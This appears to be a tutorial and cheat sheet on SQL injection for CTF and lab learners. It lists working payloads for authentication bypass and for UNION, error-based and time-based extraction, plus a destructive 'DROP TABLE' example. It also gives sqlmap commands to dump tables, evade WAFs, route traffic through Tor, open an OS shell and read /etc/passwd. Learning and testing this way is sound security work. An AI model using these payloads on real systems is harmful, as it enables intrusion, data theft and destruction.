SQL Injection (SQLi) is one of the most impactful and commonly exploited web vulnerabilities. It occurs when a web application fails to properly sanitize user-controlled input, allowing attackers to modify or execute SQL queries behind the scenes.

While manually learning SQLi fundamentals is essential—especially in training environments like Hack The Box or PortSwigger Academy—automated tools can dramatically speed up exploitation, enumeration, and data extraction once you understand what's happening under the hood.

---

## SQL Injection Overview
SQL Injection allows an attacker to:

- Bypass authentication
- Extract database contents
- Enumerate users, tables, and columns
- Modify or delete data
- Escalate to remote code execution (depending on DB engine)
- Interact with the underlying system (file reads, writes, command execution)

SQLi is possible because many applications directly concatenate user input into SQL queries. When those values aren’t sanitized, the attacker can inject their own SQL logic.

Internally, an SQLi exploitation workflow often involves:

1. Identifying a vulnerable parameter.
2. Crafting payloads to manipulate query logic.
3. Expanding to enumeration of tables/columns.
4. Dumping sensitive data (hashes, users, secrets).
5. Attempting privilege escalation (if the DB backend allows).
6. Maintaining access or leveraging DB → system pivoting.

---

## How SQL Injection Works (Step-by-Step)

1. **Send Input to the Target**  
   A tester injects characters like `'`, `"`, `)`, or SQL keywords to see how the application responds.

2. **Break or Manipulate the Query**  
   Malformed queries often produce SQL errors—or the app behaves differently (e.g., logs in without credentials).

3. **Confirm Injection**  
   Techniques like boolean-based, time-based, or UNION-based queries confirm exploitability.

4. **Extract Information**  
   Once injection is proven, controlled payloads can enumerate DB structures or dump entire tables.

5. **Escalate Capabilities**  
   Some databases (MySQL, MSSQL, PostgreSQL, Oracle) allow file reads, writes, or OS command execution.

---

## Types of SQL Injection (Brief)

- **Boolean-Based Blind**  
  Application returns different content depending on TRUE/FALSE conditions.

- **Time-Based Blind**  
  Response time changes using `SLEEP()` or `WAITFOR DELAY`.

- **Error-Based**  
  SQL errors leak database info.

- **UNION-Based**  
  Combine multiple SELECT queries to retrieve arbitrary data.

- **Stacked Queries**  
  Execute multiple statements at once (e.g., `; DROP TABLE users;`).

- **Out-of-Band (OOB)**  
  DB sends data to an external server (DNS, HTTP).

---

## Most Important SQL Injection Tools

### **sqlmap**
`sqlmap` is the most powerful and widely used SQL injection exploitation tool. It automates detection, enumeration, and extraction with minimal input.

**Why sqlmap is valuable:**
- Automatically identifies injection type  
- Supports all major DBMS (MySQL, MSSQL, Oracle, PostgreSQL, SQLite)  
- Dumps entire databases  
- Attempts OS command execution  
- Supports proxying through Burp or intercept tools  
- Highly customizable payload engine  

---

## Common SQL Injection Payloads (Manual)

### **Authentication Bypass**

```
' OR 1=1 --
" OR 1=1 --
admin' --
```

### **UNION Enumeration Skeleton**
```
' UNION SELECT 1,2,3 --
```

### **Error-Based Extraction**
```
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(user(),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a) --
```

### **Time-Based Blind**
```
' OR IF(1=1, SLEEP(5), 0)--
```

---

## Essential sqlmap Commands and Flags

### **Basic Test Against a URL**
```
sqlmap -u "[http://target.com/page.php?id=1](http://target.com/page.php?id=1)"
```

### **Specify POST Data**
```
sqlmap -u "[http://target.com/login.php](http://target.com/login.php)" --data="username=admin&password=test"
```

### **Identify the Database, Tables, and Columns**
```
--current-db  
--dbs  
--tables  
--columns -T users
```

### **Dump Table Contents**
```
--dump -T users
```

### **Bypass Filters / WAF**
```
--tamper=space2comment  
--random-agent
```

### **Use Tor or Proxy**
```
--proxy="[http://127.0.0.1:8080](http://127.0.0.1:8080/)"  
--tor --tor-type=SOCKS5 --check-tor
```

### **Risk and Level**
```
--risk=3 --level=5
```

### **Os Shell / File Interaction (If Supported)**
```
--os-shell  
--os-cmd="whoami"  
--file-read="/etc/passwd"
```

### **Batch Mode (No Prompts)**
```
--batch
````

---

## Practical SQLmap Command Example

```bash
sqlmap \
-u "http://10.129.45.23/products.php?id=5" \
--dbs \
--batch
````

### Explanation of Flags

- **-u** → Target URL
    
- **--dbs** → Enumerate databases
    
- **--batch** → Run unattended with defaults
    

---

## What to Look For

When performing SQLi testing, useful results may include:

- **True/False differences** in page content
    
- **Delays** that confirm time-based SQLi
    
- **Error leakage** exposing DB names or versions
    
- **Valid UNION responses** with row/column offsets
    
- **Extracted database contents** (users, hashes, tokens)
    
- **File or command execution** on vulnerable systems
    

---

## Takeaway

SQL Injection remains one of the most powerful attack vectors due to its ability to fully compromise authentication, data integrity, and sometimes even the underlying server. Understanding both manual techniques and automated tooling like `sqlmap` ensures you can identify and exploit SQLi efficiently in CTFs, penetration testing labs, and training environments.
